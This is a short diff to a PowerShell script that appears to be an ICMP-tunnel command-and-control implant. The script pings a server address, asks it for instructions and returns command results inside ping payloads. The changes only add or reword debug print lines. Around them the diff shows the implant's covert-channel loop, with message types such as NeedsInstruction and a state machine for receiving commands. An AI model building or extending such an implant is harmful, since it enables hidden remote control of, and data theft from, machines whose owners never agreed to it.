@@ -26,6 +26,7 @@ $PingOptions = New-Object System.Net.NetworkInformation.PingOptions;
 $PingOptions.DontFragment = $true;
 
 Function Send-ICMPMessage([ImplantMessageType]$MessageType, [Byte[]]$Data = @()) {
+	Write-Host "Sending" $MessageType "message."
 	$MessageBytes = @($MessageType) + $Data;
 	$Reply = $Ping.Send($ServerIPAddress, $PingTimeout, $MessageBytes, $PingOptions);
 	return $Reply;
@@ -41,12 +42,13 @@ $CommandResult = "";
 $CommandIndex = 0;
 
 while ($True) {
+	Write-Host "State:" $State;
 	switch ($State) {
 		WaitingForInstruction {
 			$Reply = Send-ICMPMessage -MessageType NeedsInstruction;
 			if ($Reply.Buffer.Count -gt 0) {
 				$ServerMessageType = [ServerMessageType]$Reply.Buffer[0];
-				Write-Host "ServerMessageType:" $ServerMessageType;
+				Write-Host "Server message:" $ServerMessageType;
 				switch ($ServerMessageType) {
 					NeedsPrompt {
 						$Prompt = Get-Prompt;
